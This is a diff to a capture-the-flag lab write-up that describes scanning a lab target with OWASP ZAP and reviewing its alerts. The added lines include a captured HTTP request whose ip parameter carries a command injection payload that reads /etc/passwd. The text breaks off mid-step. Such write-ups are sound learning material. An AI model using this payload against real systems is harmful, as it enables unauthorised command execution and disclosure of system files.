@@ -79,4 +79,23 @@ Solution:
 1) take target link http://94.237.61.133:39523 put it in OWASP ZAP automated scan
 2) start scan in "Attack mode" > let the Active scan, spider crawl , etc finish
 3) go to "Alerts" to check vulnerabilities found after scan
-4) Two high level vulnerabilities found "Remote OS Command Injection" ,  "SQL Injection"/""
+4) Two high level vulnerabilities found "Remote OS Command Injection" ,  "SQL Injection"/"SQL Injection - Oracle - Time Based"
+5) take the "Remote OS Command Injection"   and review its request payload :
+```
+"Remote OS Command Injection" 
+GET /devtools/ping.php?ip=127.0.0.1%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1
+Host: 94.237.61.133:39523
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+```
+![[Screenshot From 2025-04-04 12-19-46.png]]
+
+
+Now 
